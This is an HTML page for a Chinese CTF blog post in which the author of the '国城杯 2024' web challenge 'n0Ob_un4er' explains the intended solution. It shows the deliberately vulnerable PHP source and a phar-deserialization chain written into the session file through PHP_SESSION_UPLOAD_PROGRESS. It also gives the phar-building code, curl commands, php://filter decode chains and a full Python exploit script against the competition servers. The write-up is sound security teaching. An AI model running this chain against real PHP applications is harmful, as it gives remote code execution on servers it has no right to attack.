@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-QSR4GJ6TLC"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-QSR4GJ6TLC');
+</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    <link rel="shortcut icon" href="/images/favicon.ico">
+    <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <title>n0Ob_un4er | 国城杯 2024 | Litsasuk</title>
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+    <meta name="generator" content="11ty">
+
+    <!-- 1. Prism 主题 -->
+    <link href="https://cdn.jsdelivr.net/npm/prism-themes@1.9.0/themes/prism-nord.min.css" rel="stylesheet" />
+    <!-- 2. 行号插件样式 -->
+    <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet" />
+  
+    <!-- 3. Toolbar 插件样式 -->
+    <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css" rel="stylesheet" />
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+<div class="content index py4 h-card">
+
+    <header id="header">
+        <img id="logo" alt class="u-logo" src="/images/litsasuk.png" />
+
+        <div id="title">
+            <a class="u-url u-uid" href="/"> <h1 class="p-name">Litsasuk</h1> </a>
+        </div>
+
+        <div id="nav">
+            <ul>
+                <li class="icon">
+                    <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+                </li>
+                <li><a href="/">Home</a></li>
+                <li><a href="/articles/">Articles</a></li>
+                <li><a href="/categories/">Categories</a></li>
+                <li><a href="/about/">About</a></li>
+            </ul>
+        </div>
+    </header>
+
+    
+<section id="about" class="p-note">
+    <p>This is Litsasuk Speaking!</p>
+    <hr>
+    <div class="entry">
+        <div class="entry-content">
+            <div class="entry-body">
+
+                <!--文章标题-->
+                <h1 class="posttitle p-name" itemprop="name headline" style="font-size: 24px;">
+                    n0Ob_un4er | 国城杯 2024
+                </h1>
+
+                <!--时间标签-->
+                <h4 class="date-header">December 8, 2024</h4>
+
+                <!--文章正文-->
+                <h2>序</h2>
+<p>关于序言这块，本来是没有写的，现在回想起来，实在是感慨万千。我们社团出题也算是老传统了，之前是安洵杯，现在是国城杯。这道题是我出的第一道在正式比赛中使用的题目，对我具有很重大的意义。题目难度是有的，设计这道题目花费了我很大的心思，我觉得没有愧对各位热爱CTF的师傅们。</p>
+<p>题目放出来之后我是很忐忑的，因为我不确定在别人看来这道题的难度怎样，我给了很多hint(比赛结束后有师傅反馈hint没给到点上，抱歉哈哈哈)，也在最后时刻降低了难度，即使这样，这道题也是直到比赛最后一小时才有了第一解。比赛结束后有很多师傅来找我讨论，通过这道题我认识了好多厉害的师傅!😘总之，希望各位喜欢!</p>
+<h2>正文</h2>
+<p>其实这道题的代码是可以写很简单的，甚至像<a href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#one-line-php-challenge">One Line PHP Challenge</a>那样一行就能搞定，但是我又觉得这样会不会太明显了，所以加了一些干扰做题思路的代码审计，现在想来确实有点用力过猛😂。</p>
+<br>
+<h3>思路分析</h3>
+<pre><code class="language-php">&lt;?php
+$SECRET  = `/readsecret`;
+include &quot;waf.php&quot;;
+class User {
+    public $role;
+    function __construct($role) {
+        $this-&gt;role = $role;
+    }
+}
+class Admin{
+    public $code;
+    function __construct($code) {
+        $this-&gt;code = $code;
+    }
+    function __destruct() {
+        echo &quot;Admin can play everything!&quot;;
+        eval($this-&gt;code);
+    }
+}
+function game($filename) {
+    if (!empty($filename)) {
+        if (waf($filename) &amp;&amp; @copy($filename , &quot;/tmp/tmp.tmp&quot;)) {
+            echo &quot;Well done!&quot;;
+        } else {
+            echo &quot;Copy failed.&quot;;
+        }
+    } else {
+        echo &quot;User can play copy game.&quot;;
+    }
+}
+function set_session(){
+    global $SECRET;
+    $data = serialize(new User(&quot;user&quot;));
+    $hmac = hash_hmac(&quot;sha256&quot;, $data, $SECRET);
+    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));
+}
+function check_session() {
+    global $SECRET;
+    $data = $_COOKIE[&quot;session-data&quot;];
+    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2);
+    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac) || !hash_equals(hash_hmac(&quot;sha256&quot;, $data, $SECRET), $hmac)) {
+        die(&quot;hacker!&quot;);
+    }
+    $data = unserialize($data);
+    if ( $data-&gt;role === &quot;user&quot; ){
+        game($_GET[&quot;filename&quot;]);
+    }else if($data-&gt;role === &quot;admin&quot;){
+        return new Admin($_GET['code']);
+    }
+    return 0;
+}
+if (!isset($_COOKIE[&quot;session-data&quot;])) {
+    set_session();
+    highlight_file(__FILE__);
+}else{
+    highlight_file(__FILE__);
+    check_session();
+} 
+</code></pre>
+<p>先来看session的逻辑，通过check_session()校验后可以直接反序列化，但是这里使用了hmac-sha256签名算法，无法读取到$SECRET，是没有办法绕过的，只能另辟蹊径。</p>
+<p>总所周知，copy是可以使用phar伪协议的，而且只要实例化admin类就能直接命令执行了，有经验的师傅应该可以看出这里实际的利用方式是phar反序列化。但是这里没有文件上传点，一部分师傅就有可能会卡在这里了，嘿嘿，这就是这道题最精妙的地方了。</p>
+<p>我们需要找一个内部可控的文件来进行构造，可控文件无非临时文件，日志文件，session文件。临时文件无法知道文件名，日志文件无法知道路径，那么就只有session文件了。</p>
+<p>php7.2中存在一个漏洞，在默认配置下，如果强制向系统上传一个文件的话，会生成一个session文件，这个文件是可以通过Cookie的PHP_SESSION_UPLOAD_PROGRESS字段写入数据的，只能是字符串格式，而且这段数据的前后还会有系统生成的垃圾数据。</p>
+<p>那么结合之前的phar反序列化思路，不难想到可以将phar文件编码为字符串，然后写入session文件中，最后再用copy函数还原和利用。</p>
+<br>
+<p>补充说明一下waf函数的由来：</p>
+<p>我并没有给出waf的源码，其实我给这个waf的本意不是想让你们去绕的，而是为了禁止非预期解的QAQ，我在出题的时候偶然发现了这个非预期：如果用copy函数结合stdin这个伪协议去写文件的话，是可以打通的，不过还是需要将phar文件编码。各位师傅有兴趣可以试试。</p>
+<p><img src="../../../images/2024/01/image-20241028145318145.png" alt="img"></p>
+<h3>解题细节</h3>
+<h4>phar转字符串</h4>
+<p>我是用的是下面这组编码方法，后来发现其实用base64编码就行</p>
+<pre><code class="language-bash">convert.base64-encode 和 convert.base64-decode
+convert.iconv.utf-8.utf-16be 和 convert.iconv.utf-16be.utf-8
+convert.quoted-printable-encode 和 convert.quoted-printable-decode
+</code></pre>
+<p>参考文章：</p>
+<p><a href="https://blog.diggid.fun/2021/05/30/Laravel-8-Debug-Mode-RCE-%E6%8B%93%E5%B1%95%E4%B8%8E%E8%B8%A9%E5%9D%91/#payload%E6%80%BB%E7%BB%93">Laravel 8 Debug Mode RCE 拓展与踩坑 · Diggid's Blog</a></p>
+<p>生成phar文件</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+class Admin{
+    public $code;
+}
+@unlink('test.phar');
+$phar=new Phar('test.phar');
+$phar-&gt;startBuffering();
+$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');
+$o=new Admin();
+$o -&gt;code=&quot;system('/readflag');&quot;;
+$phar-&gt;setMetadata($o);
+$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>编码命令：</p>
+<pre><code class="language-bash">cat test.phar | base64 -w0 | python3 -c &quot;import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())&quot;
+</code></pre>
+<p>编码结果</p>
+<pre><code class="language-bash">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=74=00=41=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=33=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=42=00=5A=00=47=00=31=00=70=00=62=00=69=00=49=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=52=00=6C=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=77=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=6F=00=4A=00=79=00=39=00=79=00=5A=00=57=00=46=00=6B=00=5A=00=6D=00=78=00=68=00=5A=00=79=00=63=00=70=00=4F=00=79=00=49=00=37=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=64=00=58=00=42=00=74=00=6E=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=4A=00=52=00=4F=00=30=00=76=00=59=00=75=00=4B=00=35=00=35=00=4A=00=33=00=5A=00=72=00=2B=00=48=00=70=00=34=00=37=00=46=00=4B=00=68=00=6F=00=54=00=66=00=47=00=77=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00
+</code></pre>
+<h4>消除垃圾数据</h4>
+<p>由于session文件生成的规则，我们写入的数据前后都是会有系统写入的垃圾数据的</p>
+<pre><code class="language-bash">curl http://106.55.190.159:8001/ -H 'Cookie: PHPSESSID=litsasuk' -F 'PHP_SESSION_UPLOAD_PROGRESS=[Your_data]'  -F 'file=@/etc/passwd' 
+</code></pre>
+<p><img src="../../../images/2024/01/image-20241028145318143.png" alt="img"></p>
+<p>我们可以使用base64解码的特性来消除前后的字符串</p>
+<p>前面的&quot;upload_progress_&quot;一共有14位,经过fuzz我们只要在后面添加两个字符&quot;ZZ&quot;，进行3次base64解码就能被刚好消掉。</p>
+<p>如果使用的是我的编码方法，后面的垃圾数据就不用管了，在解码的时候自然就会消掉</p>
+<h4>编码细节</h4>
+<p>这里还有一个细节，就是如果我们要先进行3次base64解码来消去垃圾数据，那么我们编码后的phar文件就还需要连续进行3次base64编码，由于base64解码的特性，如果被解码的字符串中出现了&quot;=&quot;就会解码失败，所以我们还要对payload填充一下位数，使之连续3次base64编码都不会出现&quot;=&quot;,就需要满足位数为3^3的倍数</p>
+<p>原本的payload是1392位，需要填充12位再进行连续3次base64编码</p>
+<pre><code class="language-bash">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=74=00=41=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=33=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=42=00=5A=00=47=00=31=00=70=00=62=00=69=00=49=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=52=00=6C=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=77=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=6F=00=4A=00=79=00=39=00=79=00=5A=00=57=00=46=00=6B=00=5A=00=6D=00=78=00=68=00=5A=00=79=00=63=00=70=00=4F=00=79=00=49=00=37=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=64=00=58=00=42=00=74=00=6E=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=4A=00=52=00=4F=00=30=00=76=00=59=00=75=00=4B=00=35=00=35=00=4A=00=33=00=5A=00=72=00=2B=00=48=00=70=00=34=00=37=00=46=00=4B=00=68=00=6F=00=54=00=66=00=47=00=77=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00AAAAAAAAAAAA
+</code></pre>
+<h4>写文件以及读取文件</h4>
+<p>写session文件</p>
+<pre><code class="language-bash">curl http://125.70.243.22:31718 -H 'Cookie: PHPSESSID=litsasuk' -F 'PHP_SESSION_UPLOAD_PROGRESS=ZZVUZSVmQxQlVRWGRRVkZFd1VGUkJkMUJVVFRWUVZFRjNVRlJqTTFCVVFYZFFWRmw0VUZSQmQxQlVVVFJRVkVGM1VGUlJlRkJVUVhkUVZGa3pVRlJCZDFCVVZUUlFWRUYzVUZSTmVGQlVRWGRRVkUwMVVGUkJkMUJVVVRWUVZFRjNVRlJWZUZCVVFYZFFWRlV4VUZSQmQxQlVZelJRVkVGM1VGUlZNVkJVUVhkUVZGVTBVRlJCZDFCVVRYZFFWRUYzVUZSU1JsQlVRWGRRVkZWM1VGUkJkMUJVVlRCUVZFRjNVRlJWTWxCVVFYZFFWRkY1VUZSQmQxQlVVa0pRVkVGM1VGUlZNRkJVUVhkUVZGRXhVRlJCZDFCVVZUSlFWRUYzVUZSVmVsQlVRWGRRVkZKRFVGUkJkMUJVVVhwUVZFRjNVRlJhUTFCVVFYZFFWRTB6VUZSQmQxQlVVVFZRVkVGM1VGUlJNRkJVUVhkUVZFMDBVRlJCZDFCVVNrTlFWRUYzVUZSUk1GQlVRWGRRVkZWNFVGUkJkMUJVWTNkUVZFRjNVRlJqTUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSVmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY1VUZSQmQxQlVVVEZRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNVVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSTmVsQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVWVEJRVkVGM1VGUmtRbEJVUVhkUVZGcEhVRlJCZDFCVVRYaFFWRUYzVUZSU1IxQlVRWGRRVkZrMVVGUkJkMUJVVWtKUVZFRjNVRlJSZVZCVVFYZFFWRlpDVUZSQmQxQlVVVE5RVkVGM1VGUk5lRkJVUVhkUVZHTjNVRlJCZDFCVVdYbFFWRUYzVUZSWk5WQlVRWGRRVkZFMVVGUkJkMUJVVFRKUVZFRjNVRlJTUlZCVVFYZFFWRlV3VUZSQmQxQlVZM2RRVkVGM1VGUk5NMUJVUVhkUVZGbDZVRlJCZDFCVVpFSlFWRUYzVUZSYVIxQlVRWGRRVkUxM1VGUkJkMUJVVWtkUVZFRjNVRlJaTlZCVVFYZFFWRkpDVUZSQmQxQlVXa0pRVkVGM1VGUlplVkJVUVhkUVZFMTVVRlJCZDFCVVZYbFFWRUYzVUZSYVJGQlVRWGRRVkZFMVVGUkJkMUJVV2tKUVZFRjNVRlJqTUZCVVFYZFFWR1JDVUZSQmQxQlVVa2RRVkVGM1VGUmFRbEJVUVhkUVZGRTFVRlJCZDFCVVl6TlFWRUYzVUZSU1IxQlVRWGRRVkZrMVVGUkJkMUJVVWtKUVZFRjNVRlJrUWxCVVFYZFFWRmt4VUZSQmQxQlVWVFJRVkVGM1VGUlNSbEJVUVhkUVZFMTNVRlJCZDFCVVZrSlFWRUYzVUZSVk0xQlVRWGRRVkUxM1VGUkJkMUJVV2tkUVZFRjNVRlJTUWxCVVFYZFFWR00xVUZSQmQxQlVUVFZRVkVGM1VGUmpOVkJVUVhkUVZGWkNVRlJCZDFCVVZUTlFWRUYzVUZSUk1sQlVRWGRRVkZwRFVGUkJkMUJVVmtKUVZFRjNVRlJhUlZCVVFYZFFWR00wVUZSQmQxQlVXVFJRVkVGM1VGUldRbEJVUVhkUVZHTTFVRlJCZDFCVVdYcFFWRUYzVUZSamQxQlVRWGRRVkZKSFVGUkJkMUJVWXpWUVZFRjNVRlJSTlZCVVFYZFFWRTB6VUZSQmQxQlVXVEpRVkVGM1VGUlZlRkJVUVhkUVZGa3pVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhsUVZFRjNVRlJOZDFCVVFYZFFWRlpDVUZSQmQxQlVWVFJRVkVGM1VGUlNSbEJVUVhkUVZFMTNVRlJCZDFCVVVrUlFWRUYzVUZSYVJsQlVRWGRRVkZWNVVGUkJkMUJVVFRCUVZFRjNVRlJaTUZCVVFYZFFWRkY0VUZSQmQxQlVWWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUk1GQlVRWGRRVkZrd1VGUkJkMUJVVlRSUVZFRjNVRlJSZVZCVVFYZFFWR013VUZSQmQxQlVXa1pRVkVGM1VGUlJlVkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJqTkZCVVFYZFFWRXBEVUZSQmQxQlVXVEpRVkVGM1VGUk5OVkJVUVhkUVZGazFVRlJCZDFCVVRYbFFWRUYzVUZSUmVGQlVRWGRRVkZWNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUk5GQlVRWGRRVkZWNVVGUkJkMUJVV2tSUVZFRjNVRlJaZWxCVVFYZFFWRTE2VUZSQmQxQlVWWGxRVkVGM1VGUlNRbEJVUVhkUVZGVjVVRlJCZDFCVVVrZFFWRUYzVUZSTmQxQlVRWGRRVkdNeVVGUkJkMUJVVlRWUVZFRjNVRlJqTVZCVVFYZFFWRkpEVUZSQmQxQlVUVEZRVkVGM1VGUk5NVkJVUVhkUVZGSkNVRlJCZDFCVVRYcFFWRUYzVUZSV1FsQlVRWGRRVkdONVVGUkJkMUJVU2tOUVZFRjNVRlJSTkZCVVFYZFFWR04zVUZSQmQxQlVUVEJRVkVGM1VGUk5NMUJVUVhkUVZGRXlVRlJCZDFCVVVrTlFWRUYzVUZSWk5GQlVRWGRRVkZwSFVGUkJkMUJVVlRCUVZFRjNVRlJaTWxCVVFYZFFWRkV6VUZSQmQxQlVZek5RVkVGM1VGUlJOVkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNVVGUkJkMUJVVVRSUVZFRjNVRlJWZUZCVVFYZFFWRnBEVUZSQmQxQlVUWGhRVkVGM1VGUlJlbEJVUVhkUlZVWkNVVlZHUWxGVlJrSlJWVVpD'  -F 'file=@/etc/passwd' 
+</code></pre>
+<p>用filter伪协议消除垃圾数据</p>
+<pre><code class="language-bash">?filename=php://filter/read=convert.base64-
+decode|convert.base64-decode|convert.base64-decode|convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-
+decode/resource=/tmp/sess_litsasuk
+</code></pre>
+<p>读文件触发phar反序列化</p>
+<pre><code class="language-bash">?filename=phar:///tmp/tmp.tmp/test.txt
+</code></pre>
+<h3>一把梭脚本</h3>
+<p>本来打算是要条件竞争的，但是到最后1个小时没题解，可把我急坏了，包被😭😭😭，所以把条件竞争关了QAQ</p>
+<pre><code class="language-python">import sys
+from threading import Thread, Event
+import requests
+
+HOST = 'http://125.70.243.22:31303/'
+sess_name = 'litsasuk'
+
+headers = {
+    'Connection': 'close',
+    'Cookie': 'PHPSESSID=' + sess_name
+}
+stop_event = Event()
+payload = 'VUZSVmQxQlVRWGRRVkZFd1VGUkJkMUJVVFRWUVZFRjNVRlJqTTFCVVFYZFFWRmw0VUZSQmQxQlVVVFJRVkVGM1VGUlJlRkJVUVhkUVZGa3pVRlJCZDFCVVZUUlFWRUYzVUZSTmVGQlVRWGRRVkUwMVVGUkJkMUJVVVRWUVZFRjNVRlJWZUZCVVFYZFFWRlV4VUZSQmQxQlVZelJRVkVGM1VGUlZNVkJVUVhkUVZGVTBVRlJCZDFCVVRYZFFWRUYzVUZSU1JsQlVRWGRRVkZWM1VGUkJkMUJVVlRCUVZFRjNVRlJWTWxCVVFYZFFWRkY1VUZSQmQxQlVVa0pRVkVGM1VGUlZNRkJVUVhkUVZGRXhVRlJCZDFCVVZUSlFWRUYzVUZSVmVsQlVRWGRRVkZKRFVGUkJkMUJVVVhwUVZFRjNVRlJhUTFCVVFYZFFWRTB6VUZSQmQxQlVVVFZRVkVGM1VGUlJNRkJVUVhkUVZFMDBVRlJCZDFCVVNrTlFWRUYzVUZSUk1GQlVRWGRRVkZWNFVGUkJkMUJVWTNkUVZFRjNVRlJqTUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSVmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY1VUZSQmQxQlVVVEZRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNVVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSTmVsQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVWVEJRVkVGM1VGUmtRbEJVUVhkUVZGcEhVRlJCZDFCVVRYaFFWRUYzVUZSU1IxQlVRWGRRVkZrMVVGUkJkMUJVVWtKUVZFRjNVRlJSZVZCVVFYZFFWRlpDVUZSQmQxQlVVVE5RVkVGM1VGUk5lRkJVUVhkUVZHTjNVRlJCZDFCVVdYbFFWRUYzVUZSWk5WQlVRWGRRVkZFMVVGUkJkMUJVVFRKUVZFRjNVRlJTUlZCVVFYZFFWRlV3VUZSQmQxQlVZM2RRVkVGM1VGUk5NMUJVUVhkUVZGbDZVRlJCZDFCVVpFSlFWRUYzVUZSYVIxQlVRWGRRVkUxM1VGUkJkMUJVVWtkUVZFRjNVRlJaTlZCVVFYZFFWRkpDVUZSQmQxQlVXa0pRVkVGM1VGUlplVkJVUVhkUVZFMTVVRlJCZDFCVVZYbFFWRUYzVUZSYVJGQlVRWGRRVkZFMVVGUkJkMUJVV2tKUVZFRjNVRlJqTUZCVVFYZFFWR1JDVUZSQmQxQlVVa2RRVkVGM1VGUmFRbEJVUVhkUVZGRTFVRlJCZDFCVVl6TlFWRUYzVUZSU1IxQlVRWGRRVkZrMVVGUkJkMUJVVWtKUVZFRjNVRlJrUWxCVVFYZFFWRmt4VUZSQmQxQlVWVFJRVkVGM1VGUlNSbEJVUVhkUVZFMTNVRlJCZDFCVVZrSlFWRUYzVUZSVk0xQlVRWGRRVkUxM1VGUkJkMUJVV2tkUVZFRjNVRlJTUWxCVVFYZFFWR00xVUZSQmQxQlVUVFZRVkVGM1VGUmpOVkJVUVhkUVZGWkNVRlJCZDFCVVZUTlFWRUYzVUZSUk1sQlVRWGRRVkZwRFVGUkJkMUJVVmtKUVZFRjNVRlJhUlZCVVFYZFFWR00wVUZSQmQxQlVXVFJRVkVGM1VGUldRbEJVUVhkUVZHTTFVRlJCZDFCVVdYcFFWRUYzVUZSamQxQlVRWGRRVkZKSFVGUkJkMUJVWXpWUVZFRjNVRlJSTlZCVVFYZFFWRTB6VUZSQmQxQlVXVEpRVkVGM1VGUlZlRkJVUVhkUVZGa3pVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhsUVZFRjNVRlJOZDFCVVFYZFFWRlpDVUZSQmQxQlVWVFJRVkVGM1VGUlNSbEJVUVhkUVZFMTNVRlJCZDFCVVVrUlFWRUYzVUZSYVJsQlVRWGRRVkZWNVVGUkJkMUJVVFRCUVZFRjNVRlJaTUZCVVFYZFFWRkY0VUZSQmQxQlVWWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUk1GQlVRWGRRVkZrd1VGUkJkMUJVVlRSUVZFRjNVRlJSZVZCVVFYZFFWR013VUZSQmQxQlVXa1pRVkVGM1VGUlJlVkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNFVGUkJkMUJVVVhoUVZFRjNVRlJqTkZCVVFYZFFWRXBEVUZSQmQxQlVXVEpRVkVGM1VGUk5OVkJVUVhkUVZGazFVRlJCZDFCVVRYbFFWRUYzVUZSUmVGQlVRWGRRVkZWNFVGUkJkMUJVVVhoUVZFRjNVRlJSZUZCVVFYZFFWRkY0VUZSQmQxQlVVWGhRVkVGM1VGUlJlRkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUk5GQlVRWGRRVkZWNVVGUkJkMUJVV2tSUVZFRjNVRlJaZWxCVVFYZFFWRTE2VUZSQmQxQlVWWGxRVkVGM1VGUlNRbEJVUVhkUVZGVjVVRlJCZDFCVVVrZFFWRUYzVUZSTmQxQlVRWGRRVkdNeVVGUkJkMUJVVlRWUVZFRjNVRlJqTVZCVVFYZFFWRkpEVUZSQmQxQlVUVEZRVkVGM1VGUk5NVkJVUVhkUVZGSkNVRlJCZDFCVVRYcFFWRUYzVUZSV1FsQlVRWGRRVkdONVVGUkJkMUJVU2tOUVZFRjNVRlJSTkZCVVFYZFFWR04zVUZSQmQxQlVUVEJRVkVGM1VGUk5NMUJVUVhkUVZGRXlVRlJCZDFCVVVrTlFWRUYzVUZSWk5GQlVRWGRRVkZwSFVGUkJkMUJVVlRCUVZFRjNVRlJaTWxCVVFYZFFWRkV6VUZSQmQxQlVZek5RVkVGM1VGUlJOVkJVUVhkUVZGRjRVRlJCZDFCVVVYaFFWRUYzVUZSUmVGQlVRWGRRVkZGNVVGUkJkMUJVVVRSUVZFRjNVRlJWZUZCVVFYZFFWRnBEVUZSQmQxQlVUWGhRVkVGM1VGUlJlbEJVUVhkUlZVWkNVVlZHUWxGVlJrSlJWVVpD'
+response = requests.get(HOST, headers=headers)
+cookies = response.cookies
+
+def runner1():
+    data = {
+        'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload
+    }
+    print(&quot;Exploding...&quot;)
+    while 1:
+        fp = open('/etc/passwd', 'rb')
+        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
+        fp.close()
+
+
+def runner2():
+    file = '/tmp/sess_' + sess_name
+    filename = 'php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s' % file
+    # print filename
+    while 1:
+        url = '%s?filename=%s' % (HOST, filename)
+        r = requests.get(url, cookies=cookies)
+        c = r.content
+
+
+def runner3():
+    filename = 'phar:///tmp/tmp.tmp/test.txt'
+    while True:
+        url = f'{HOST}?filename={filename}'
+        r = requests.get(url, cookies=cookies)
+        content = r.text
+
+        if &quot;D0g3&quot; in content:
+            start_index = content.index(&quot;D0g3&quot;)
+            output = content[start_index:]
+            print(output)
+            sys.exit(0)
+
+threads = []
+t1 = Thread(target=runner1)
+t2 = Thread(target=runner2)
+t3 = Thread(target=runner3)
+
+threads.append(t1)
+threads.append(t2)
+threads.append(t3)
+
+t1.start()
+t2.start()
+t3.start()
+
+for t in threads:
+    t.join()
+</code></pre>
+<p><img src="../../../images/2024/01/image-20241206200900045.png" alt="img"></p>
+<h3>参考文章</h3>
+<p><a href="https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/">https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/</a></p>
+<p><a href="https://xz.aliyun.com/t/2958">https://xz.aliyun.com/t/2958</a></p>
+<p><a href="https://blog.diggid.fun/2021/05/30/Laravel-8-Debug-Mode-RCE-%E6%8B%93%E5%B1%95%E4%B8%8E%E8%B8%A9%E5%9D%91/#payload%E6%80%BB%E7%BB%93">Laravel 8 Debug Mode RCE 拓展与踩坑 · Diggid's Blog</a></p>
+<p><a href="https://xz.aliyun.com/t/1773/?time__1311=7qAODKiKYvwbDs5YYK0%3DjM7jDu0SfeD">https://xz.aliyun.com/t/1773/</a></p>
